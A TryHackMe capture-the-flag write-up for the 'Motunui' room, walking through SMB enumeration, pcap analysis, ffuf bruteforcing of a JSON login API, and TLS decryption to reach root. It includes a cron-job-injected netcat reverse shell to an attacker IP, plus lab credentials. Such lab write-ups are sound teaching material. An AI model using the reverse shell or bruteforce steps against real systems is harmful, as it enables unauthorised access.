# 93 - Motunui (json bruteforce, Decrypting SSL/TLS with Wireshark)

Room Link --> [https://tryhackme.com/room/motunui](https://tryhackme.com/room/motunui)

### Enumeration

{% code overflow="wrap" lineNumbers="true" %}
```bash
PORT     STATE SERVICE     VERSION 
22/tcp   open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp   open  http        Apache httpd 2.4.29 ((Ubuntu))
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X
445/tcp  open  netbios-ssn Samba smbd 4.7.6-Ubuntu
3000/tcp open  ppp?
5000/tcp open  ssl/http    Node.js (Express middleware)
```
{% endcode %}

#### SMB Enum

```bash
crackmapexec smb -u 'anonymous' -p 'anonymous' 10.10.99.241 --shares
# or
smbmap -H 10.10.99.241 -u 'anonymous' -p 'anonymous'

Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	traces                                            	READ ONLY	Network shared files
	IPC$                                              	NO ACCESS	IPC Service (motunui server (Samba, Ubuntu))
```

```bash
dking@dking ~/Downloads$ smbclient //10.10.99.241/traces                                                        
Password for [WORKGROUP\dking]:
Try "help" to get a list of possible commands.
smb: \> ls -al
NT_STATUS_NO_SUCH_FILE listing \-al
smb: \> ls
  .                                   D        0  Thu Jul  9 04:48:54 2020
  ..                                  D        0  Thu Jul  9 04:48:27 2020
  moana                               D        0  Thu Jul  9 04:50:12 2020
  maui                                D        0  Mon Aug  3 17:22:03 2020
  tui                                 D        0  Thu Jul  9 04:50:40 2020

		19475088 blocks of size 1024. 11271440 blocks available
smb: \> 
```

```bash
smbclient //10.10.99.241/traces

dking@dking ~/Downloads$ ls -al
-rw-r--r--  1 dking dking  78K Nov 24 07:14 ticket_6746.pcapng
```

we can use [Wireshark](https://www.wireshark.org/) to open. There is an http image transfer that can be exported using the menu `File > Export Objects > HTTP` . Then click on the file and save.

The image is a screenshot that shows a Virtual Host on the address bar. I then added that to my hosts file.

<figure><img src="https://miro.medium.com/v2/resize:fit:602/1*tSc0K2HxYtGMBiyYAkLb-g.png" alt="" height="394" width="700"><figcaption><p>Export image file from Pcap</p></figcaption></figure>

We got a virtual host name from the image.

<figure><img src=".gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

Add to /etc/hosts file --> `d3v3lopm3nt.motunui.thm`&#x20;

Doing another dir bruteforce:

{% code overflow="wrap" %}
```bash
gobuster dir -u http://d3v3lopm3nt.motunui.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -t 50 

/index.php (Status: 200)
/docs (Status: 301)
/javascript (Status: 301)
```
{% endcode %}

Navigating to `/docs` it redirected us to download a `README.md` file.

```bash
dking@dking ~/Downloads$ cat README.md 
# Documentation for the in-development API

##### [Changelog](CHANGELOG.md) | [Issues](ISSUES.md)

Please do not distribute this documentation outside of the development team.

## Routes
Find all of the routes [here](ROUTES.md).
```

We get information about the in-development API service. It says there are few other files on the /docs, so I downloaded all of them and there is not much on the files except ROUTES.md.

{% code title="ROUTES.md" %}
````bash
dking@dking ~/Downloads$ cat ROUTES.md
# Routes

The base URL for the api is `api.motunui.thm:3000/v2/`.

### `POST /login`
Returns the hash for the specified user to be used for authorisation.
#### Parameters
- `username`
- `password`
#### Response (200)
```js
{
	"hash": String()
}
```
#### Response (401)
```js
{
	"error": "invalid credentials"
}
```

### 🔐 `GET /jobs`
Returns all the cron jobs running as the current user.
#### Parameters
- `hash`
#### Response (200)
```js
{
	"jobs": Array()
}
```
#### Response (403)
```js
{
	"error": "you are unauthorised to view this resource"
}
```

### 🔐 `POST /jobs`
Creates a new cron job running as the current user.
#### Parameters
- `hash`
#### Response (201)
```js
{
	"job": String()
}
```
#### Response (401)
```js
{
	"error": "you are unauthorised to view this resource"
}
```
````
{% endcode %}

So we got another virtual host --> `api.motunui.thm`-  running on port 3000.

Navigating to `api.motunui.thm:3000/v2/login` using a POST request. We get an "Invalid Credentials" just like the ROUTES.md" file said, so we need to pass in the "username and password" parameters with the correct credentials too before we can access the `/jobs` dir.

I tried some default credentials to login using curl, but didn't work.

{% code overflow="wrap" %}
```bash
curl http://api.motunui.thm:3000/v2/login -X POST -d '{"username":"admin","password":"admin"}'

{"error":"invalid credentials"}
```
{% endcode %}

### Initial Access

As the api version was v2, I checked whether the old api version was still available.

```bash
local@local:~/Documents/tryhackme/motunui$ curl http://api.motunui.thm:3000/v1/login
{"message":"please get maui to update these routes"}
```

And we get message back leaking a potential username --> `maui`&#x20;

So we have to bruteforce his password, just like the room description (JSON bruteforce).

We can use wfuzz, ffuf or [jsonbrute](https://github.com/Jake-Ruston/JSONBrute) tool.

{% code overflow="wrap" %}
```bash
ffuf -u http://api.motunui.thm:3000/v2/login -w /usr/share/wordlists/rockyou.txt -X POST -H 'Content-Type: application/json' -d '{"username":"maui","password":"FUZZ"}' -fs 31

island
```
{% endcode %}

We got the password.

{% code overflow="wrap" %}
```bash
dking@dking ~/Downloads$ curl http://api.motunui.thm:3000/v2/login -X POST -H 'Content-Type: application/json' -d '{"username":"maui","password":"island"}'

{"hash":"aXNsYW5k"}            
# we get hash now.
```
{% endcode %}

We can jnow check running jobs for this user.

{% code overflow="wrap" %}
```bash
dking@dking ~/Downloads$ curl http://api.motunui.thm:3000/v2/jobs -X GET -H 'Content-Type: application/json' -d '{"hash":"aXNsYW5k"}'

{"jobs":["* * * * * echo \"They have stolen the heart from inside you, but that does not define you\" > /tmp/quote"]}
```
{% endcode %}

No reasonable jobs for the `maui` user, we can edit this to spawn a reverse shell for us.

```bash
# i used burpsuite, curl was misbehaving for me.
{
"hash":"aXNsYW5k",
"job":"* * * * * rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.18.88.214 9000 >/tmp/f"
}
```

<figure><img src=".gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

And got shell almost immediately.

<figure><img src=".gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

### Priv Esc to moana

{% code overflow="wrap" %}
```bash
www-data@motunui:/home/moana$ cat read_me 
I know you've been on vacation and the last thing you want is me nagging you.

But will you please consider not using the same password for all services? It puts us all at risk.

I have started planning the new network design in packet tracer, and since you're 'the best engineer this island has seen', go find it and finish it.
```
{% endcode %}

So a hint: packet tracet user uses `.pkt` extension. We can use find to search for `.pkt` files.

```bash
find / -type f -iname "*.pkt" -readable 2>/dev/null

/etc/network.pkt
```

We have to open this file with Cisco Packet tracer.

#### Analyzing file on packet tracer <a href="#analyzing-file-on-packet-tracer" id="analyzing-file-on-packet-tracer"></a>

#### Network Topology[Permalink](https://shishirsubedi.com.np/thm/motunui/#network-topology) <a href="#network-topology" id="network-topology"></a>

As I was looking around the configurations and information for router and switches, I found a password for user moana on switch config.

<figure><img src="https://shishirsubedi.com.np/assets/images/thm/motunui/5.png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

We can use the password to login `moana` account via ssh.

```
moana : H0wF4ri'LLG0
```

### Priv Esc

Run LinPEAS.sh on the box.

<figure><img src=".gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

This file is a pre-master **secret key** uses to decrypt TLS which we can use in Wireshark as we also found some TLS traffics on the PCAP file.

#### Decrypting SSL/TLS with Wireshark

Use this [blog](https://www.comparitech.com/net-admin/decrypt-ssl-with-wireshark/?source=post\_page-----a73032b26705--------------------------------) to decrypt TLS / SSL traffic using Wireshark.

<figure><img src=".gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```bash
# we got the password for root user.
root : Pl3aseW0rk
```
{% endcode %}

<figure><img src=".gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

`su root` and we are root.

Done!

